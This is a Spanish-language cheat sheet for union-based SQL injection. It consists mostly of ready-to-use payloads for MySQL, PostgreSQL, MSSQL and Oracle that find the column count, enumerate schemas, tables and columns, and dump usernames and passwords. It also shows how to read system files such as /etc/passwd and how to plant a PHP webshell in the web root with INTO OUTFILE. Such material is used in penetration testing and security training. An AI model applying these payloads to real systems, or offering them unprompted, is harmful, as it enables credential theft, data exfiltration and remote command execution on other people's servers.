# Union-Based SQL

Utiliza el operador `UNION` de SQL para añadir una segunda consulta a la original y recuperar datos de otras tablas. El resultado de la consulta inyectada se devuelve junto con los datos legítimos.

**Requisitos:**

1. La consulta original debe devolver resultados visibles en la respuesta
2. La query inyectada debe tener el mismo número de columnas que la original
3. Los tipos de datos deben ser compatibles

### Paso 1 - Determinar el número de columnas

#### Método ORDER BY (más silencioso)

```sql
' ORDER BY 1 -- -    → sin error
' ORDER BY 2 -- -    → sin error
' ORDER BY 3 -- -    → sin error
' ORDER BY 4 -- -    → ERROR → la query tiene 3 columnas
```

> Incrementar hasta obtener error. El último número sin error = número de columnas.

#### Método UNION SELECT NULL

```sql
' UNION SELECT NULL -- -
' UNION SELECT NULL,NULL -- -
' UNION SELECT NULL,NULL,NULL -- -     
```

> En Oracle, siempre agregar `FROM dual`:

```sql
' UNION SELECT NULL FROM dual -- -
' UNION SELECT NULL,NULL FROM dual -- -
```

### Paso 2 - Identificar columnas con output visible

Una vez conocido el número de columnas, encontrar cuáles se reflejan en la respuesta:

```sql
-- Con 3 columnas, probar con strings
' UNION SELECT 'a',NULL,NULL -- -
' UNION SELECT NULL,'a',NULL -- -
' UNION SELECT NULL,NULL,'a' -- -
```

La columna que muestre el carácter `a` en la respuesta es la que usaremos para exfiltrar.

```sql
-- Si hay múltiples columnas visibles, concatenar en una sola
' UNION SELECT NULL,concat(dato1,0x7c,dato2),NULL -- -
```

### Paso 3 - Extraer información

#### Información del servidor

```sql
-- MySQL
' UNION SELECT NULL,version(),database() -- -
' UNION SELECT NULL,user(),@@datadir -- -

-- PostgreSQL
' UNION SELECT NULL,version(),current_database() -- -
' UNION SELECT NULL,current_user,NULL -- -

-- MSSQL
' UNION SELECT NULL,@@version,db_name() -- -
' UNION SELECT NULL,system_user,NULL -- -

-- Oracle
' UNION SELECT NULL,banner,NULL FROM v$version -- -
' UNION SELECT NULL,ora_database_name,NULL FROM dual -- -
```

#### Enumerar bases de datos

```sql
-- MySQL / PostgreSQL / MSSQL
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata -- -

-- Oracle
' UNION SELECT NULL,owner,NULL FROM all_tables -- -
```

#### Enumerar tablas

```sql
-- MySQL / PostgreSQL / MSSQL
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database() -- -

-- Oracle
' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE owner='TARGET_SCHEMA' -- -
```

#### Enumerar columnas

```sql
-- MySQL / PostgreSQL / MSSQL
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users' -- -

-- Oracle
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS' -- -
```

#### Extraer datos de una tabla

```sql
-- Registro a registro
' UNION SELECT NULL,username,password FROM users LIMIT 0,1 -- -
' UNION SELECT NULL,username,password FROM users LIMIT 1,1 -- -

-- Todo en una fila (MySQL)
' UNION SELECT NULL,group_concat(username,0x3a,password SEPARATOR 0x0a),NULL FROM users -- -

-- Todo en una fila (PostgreSQL)
' UNION SELECT NULL,string_agg(username||':'||password, chr(10)),NULL FROM users -- -

-- Todo en una fila (MSSQL)
' UNION SELECT NULL,STRING_AGG(username+':'+password, CHAR(10)),NULL FROM users -- -
```

### Casos especiales

#### La query original no devuelve resultados

Si la condición original devuelve FALSE (0 resultados), el UNION sí devolverá los nuestros:

```sql
-- Forzar 0 resultados en la query original
' AND 1=2 UNION SELECT NULL,username,password FROM users -- -

-- O con un ID que no existe
' UNION SELECT NULL,username,password FROM users -- -  (con id=0 o id=-1)
```

#### Número de columnas con tipos estrictos (MSSQL/Oracle)

```sql
-- MSSQL no acepta NULL en algunos contextos, usar valores tipados
' UNION SELECT 'a','b','c' -- -
' UNION SELECT 1,2,3 -- -
' UNION SELECT 1,'data',3 -- -
```

#### Leer archivos del sistema (MySQL con FILE privilege)

```sql
-- Leer archivo
' UNION SELECT NULL,load_file('/etc/passwd'),NULL -- -
' UNION SELECT NULL,load_file('C:\\Windows\\win.ini'),NULL -- -

-- Escribir archivo (webshell)
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php' -- -
```

### Metodología

```
1. Confirmar número de columnas
   → ORDER BY 1,2,3... hasta error

2. Identificar columnas visibles
   → UNION SELECT 'a','b','c'...

3. Extraer metadata
   → version(), database(), user()

4. Listar tablas
   → FROM information_schema.tables

5. Listar columnas de la tabla objetivo
   → FROM information_schema.columns WHERE table_name='X'

6. Dump de datos
   → SELECT username,password FROM users
   → Usar group_concat para volcar todo de una vez
```

> Si el output está codificado en HTML, intentar buscar el valor en el source code de la página.

> `group_concat` en MySQL tiene un límite de 1024 chars por defecto. Si los datos se truncan, usar `LIMIT` para paginar.
